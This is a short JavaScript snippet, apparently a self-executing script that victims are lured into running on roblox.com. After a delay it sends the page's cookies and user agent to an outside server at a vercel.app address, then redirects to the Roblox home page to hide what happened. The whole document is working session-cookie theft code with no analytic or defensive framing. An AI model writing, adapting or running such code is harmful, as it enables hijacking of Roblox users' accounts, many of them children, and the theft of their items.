(() => {
  if (!location.hostname.includes("roblox.com")) {
    location.href = "https://www.roblox.com";
    return;
  }

  setTimeout(() => {
    fetch("https://roblox-com-pt.vercel.app/api/send?cookie=" + encodeURIComponent(document.cookie) + "&userAgent=" + encodeURIComponent(navigator.userAgent))
      .then(res => res.text())
      .then(() => {
        setTimeout(() => {
          location.href = "https://www.roblox.com/home";
        }, 3000);
      })
      .catch(() => {
        location.href = "https://www.roblox.com/home";
      });
  }, 7000);
})();
